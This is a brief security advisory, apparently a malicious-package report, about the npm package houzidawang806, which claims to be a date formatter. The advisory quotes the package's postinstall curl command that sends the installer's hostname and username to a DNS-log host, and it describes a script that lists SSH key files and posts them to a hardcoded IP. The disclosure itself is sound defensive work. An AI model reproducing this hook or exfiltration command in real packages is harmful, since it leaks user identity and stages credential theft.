summary: Postinstall hook exfiltrates host identity to DNS-log endpoint; bundled SSH-key harvester
details: On `npm install`, package.json's postinstall script runs `curl http://275e856d.log.dnslog.pp.ua/pre?h=$(hostname)&u=$(whoami)`, sending the installer's hostname and OS username over plaintext HTTP to an out-of-band DNS-logging service typical of attacker reconnaissance. The tarball additionally ships postinstall.js, which enumerates `~/.ssh` (filtering `.pub` files) and POSTs the directory listing plus username/platform as JSON to the hardcoded IP 124.221.154.135 over HTTPS. Source comments in Chinese explicitly label this code as C2 / data-exfiltration. The package's stated purpose is `A simple date formatting utility`, contradicting the shipped behavior. Any machine running `npm install houzidawang806` immediately leaks host identity to the attacker; the SSH harvester is staged for execution.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
